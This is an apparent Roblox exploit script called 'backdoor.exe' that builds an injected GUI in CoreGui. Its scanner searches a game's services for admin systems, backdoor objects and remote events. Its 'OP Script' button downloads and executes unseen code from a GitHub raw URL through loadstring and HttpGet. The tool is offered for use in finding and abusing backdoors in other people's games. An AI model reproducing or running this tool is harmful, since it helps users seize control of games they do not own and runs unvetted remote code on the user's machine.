-- backdoor.exe by Ozil

local gui = Instance.new("ScreenGui", game.CoreGui)
gui.Name = "backdoor.exe"

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 400, 0, 440)
frame.Position = UDim2.new(0.5, -200, 0.5, -220)
frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
frame.BorderSizePixel = 0
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)

local title = Instance.new("TextLabel", frame)
title.Text = "🧠 backdoor.exe - Scanner + Executor"
title.Size = UDim2.new(1, 0, 0, 40)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 20

-- Scan Button
local scanBtn = Instance.new("TextButton", frame)
scanBtn.Text = "🔍 Scan Game"
scanBtn.Size = UDim2.new(0.9, 0, 0, 35)
scanBtn.Position = UDim2.new(0.05, 0, 0, 50)
scanBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
scanBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
scanBtn.Font = Enum.Font.Gotham
scanBtn.TextSize = 18
Instance.new("UICorner", scanBtn).CornerRadius = UDim.new(0, 6)

-- Console Button
local consoleBtn = Instance.new("TextButton", frame)
consoleBtn.Text = "🖥️ Open Console"
consoleBtn.Size = UDim2.new(0.9, 0, 0, 35)
consoleBtn.Position = UDim2.new(0.05, 0, 0, 95)
consoleBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
consoleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
consoleBtn.Font = Enum.Font.Gotham
consoleBtn.TextSize = 18
Instance.new("UICorner", consoleBtn).CornerRadius = UDim.new(0, 6)

-- OP Script Button
local opBtn = Instance.new("TextButton", frame)
opBtn.Text = "💀 OP Script"
opBtn.Size = UDim2.new(0.9, 0, 0, 35)
opBtn.Position = UDim2.new(0.05, 0, 0, 140)
opBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
opBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
opBtn.Font = Enum.Font.Gotham
opBtn.TextSize = 18
Instance.new("UICorner", opBtn).CornerRadius = UDim.new(0, 6)

-- Result Output
local results = Instance.new("ScrollingFrame", frame)
results.Size = UDim2.new(0.9, 0, 0, 210)
results.Position = UDim2.new(0.05, 0, 0, 185)
results.CanvasSize = UDim2.new(0, 0, 5, 0)
results.ScrollBarThickness = 5
results.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
results.BorderSizePixel = 0
Instance.new("UICorner", results).CornerRadius = UDim.new(0, 6)

local layout = Instance.new("UIListLayout", results)
layout.Padding = UDim.new(0, 4)

-- Add result line
local function AddResult(text, color)
	local lbl = Instance.new("TextLabel")
	lbl.Text = text
	lbl.Size = UDim2.new(1, -10, 0, 22)
	lbl.BackgroundTransparency = 1
	lbl.TextColor3 = color or Color3.fromRGB(255, 255, 255)
	lbl.Font = Enum.Font.Gotham
	lbl.TextSize = 15
	lbl.TextXAlignment = Enum.TextXAlignment.Left
	lbl.Parent = results
end

-- Keywords to check for
local keywords = {"HDAdmin", "Adonis", "Kohls", "Backdoor", "RemoteEvent", "RemoteFunction", "Script"}

-- Deep scan
local function deepScan(obj)
	for _, v in pairs(obj:GetDescendants()) do
		for _, word in pairs(keywords) do
			if string.find(v.Name:lower(), word:lower()) then
				AddResult("⚠️ Found: " .. v:GetFullName(), Color3.fromRGB(255, 100, 100))
			end
		end
	end
end

-- Run scan
local function runScan()
	results:ClearAllChildren()
	layout.Parent = results
	AddResult("🔎 Scanning...", Color3.fromRGB(150, 255, 150))

	local services = {
		game.Workspace,
		game.Lighting,
		game.ReplicatedStorage,
		game.ServerScriptService,
		game.StarterPlayer,
		game.StarterGui,
		game.Players,
		game.ServerStorage,
	}

	for _, service in pairs(services) do
		pcall(function()
			deepScan(service)
		end)
	end

	AddResult("✅ Scan complete!", Color3.fromRGB(100, 255, 100))
end

-- Button handlers
scanBtn.MouseButton1Click:Connect(runScan)

consoleBtn.MouseButton1Click:Connect(function()
	game:GetService("StarterGui"):SetCore("DevConsoleVisible", true)
end)

opBtn.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/zazol666/scanner/refs/heads/main/backdoor", true))()
end)
